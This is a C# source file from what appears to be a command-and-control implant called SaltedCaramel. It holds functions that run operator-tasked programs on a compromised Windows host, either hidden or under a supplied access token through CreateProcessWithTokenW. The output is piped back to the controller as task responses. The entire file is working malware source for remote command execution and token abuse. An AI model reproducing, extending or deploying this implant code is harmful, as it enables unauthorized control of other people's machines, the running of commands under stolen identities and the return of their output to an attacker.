﻿using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SaltedCaramel
{
    class SaltedCaramelProcess
    {
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcessWithTokenW(IntPtr hToken, IntPtr dwLogonFlags,
            string lpApplicationName, string lpCommandLine, IntPtr dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        private enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct STARTUPINFO
        {
             public Int32 cb;
             public IntPtr lpReserved;
             public IntPtr lpDesktop;
             public IntPtr lpTitle;
             public Int32 dwX;
             public Int32 dwY;
             public Int32 dwXSize;
             public Int32 dwYSize;
             public Int32 dwXCountChars;
             public Int32 dwYCountChars;
             public Int32 dwFillAttribute;
             public Int32 dwFlags;
             public Int16 wShowWindow;
             public Int16 cbReserved2;
             public IntPtr lpReserved2;
             public IntPtr hStdInput;
             public IntPtr hStdOutput;
             public IntPtr hStdError;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern int GetProcessId(IntPtr handle);

        internal static void StartProcessWithToken(IntPtr TokenHandle, SaltedCaramelImplant implant, SaltedCaramelTask task)
        {
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            string file = split[0];
            PROCESS_INFORMATION newProc = new PROCESS_INFORMATION();
            STARTUPINFO startupInfo = new STARTUPINFO();
            string directory = "C:\\Temp";

            NamedPipeServerStream pipeServer = new NamedPipeServerStream("CaramelPipe", PipeDirection.InOut);

            NamedPipeClientStream pipeClient = new NamedPipeClientStream("CaramelPipe");
            pipeClient.Connect();
            pipeServer.WaitForConnection();

            if (pipeClient.IsConnected)
            {
                startupInfo.hStdInput = pipeClient.SafePipeHandle.DangerousGetHandle();
                startupInfo.hStdOutput = pipeClient.SafePipeHandle.DangerousGetHandle();
            }
            else implant.SendError(task.id, "[!] DispatchTask -> StartProcessWithToken - ERROR connecting to named pipe");


            bool createProcess = CreateProcessWithTokenW(TokenHandle, IntPtr.Zero, file, argString, IntPtr.Zero, IntPtr.Zero, directory, ref startupInfo, out newProc);
            if (createProcess)
            {
                Debug.WriteLine("[-] DispatchTask -> StartProcessWithToken - Created process with PID " + newProc.dwProcessId);

                Process test = Process.GetProcessById(GetProcessId(newProc.hProcess));
                Debug.WriteLine("Got process handle!");

                IntPtr wait = (IntPtr) 1;
                ThreadPool.QueueUserWorkItem((p) => wait = WaitForSingleObject(newProc.hProcess, (UInt32)1));
                while (wait != IntPtr.Zero)
                {
                    using (StreamReader reader = new StreamReader(pipeServer))
                    {
                        string message = reader.ReadLine();
                        if (message != null)
                        {
                            message += "\n";
                            TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(message), task.id);
                            implant.PostResponse(response);
                        }
                    }
                }
                Debug.WriteLine(wait);

                pipeClient.Close();
                pipeServer.Close();
                implant.SendComplete(task.id);
            }
            else // TODO: Throw exception on error
            {
                string errorMessage = Marshal.GetLastWin32Error().ToString();
                Debug.WriteLine("[!] DispatchTask -> StartProcessWithToken - ERROR starting process: " + errorMessage);
                pipeClient.Close();
                pipeServer.Close();
                implant.SendError(task.id, "Error starting process: " + errorMessage);
            }
        }

        internal static void StartProcess(SaltedCaramelImplant implant, SaltedCaramelTask task)
        {
            // TODO: Figure out how to hook StandardError and StandardOutput at the same time
            string[] split = task.@params.Trim().Split(' ');
            string argString = string.Join(" ", split.Skip(1).ToArray());
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = split[0];
            startInfo.Arguments = argString;
            startInfo.UseShellExecute = false;
            startInfo.RedirectStandardOutput = true;
            startInfo.CreateNoWindow = true;

            Process proc = new Process();
            proc.StartInfo = startInfo;

            string procOutput = "";
            try
            {
                Debug.WriteLine("[-] DispatchTask -> StartProcess - Tasked to start process " + startInfo.FileName);
                proc.Start();

                while (!proc.StandardOutput.EndOfStream)
                {
                    string line = proc.StandardOutput.ReadLine();
                    procOutput += line + "\n";
                }

                // Strip unnecessary newline
                // TODO: fix the need for this
                procOutput = procOutput.TrimEnd();
                proc.WaitForExit();
                TaskResponse response = new TaskResponse(JsonConvert.SerializeObject(procOutput), task.id);
                implant.PostResponse(response);
                implant.SendComplete(task.id);
            }
            catch (Exception e)
            {
                Debug.WriteLine("[!] DispatchTask -> StartProcess - ERROR starting process: " + e.Message);
                implant.SendError(task.id, e.Message);
            }
        }
    }
}
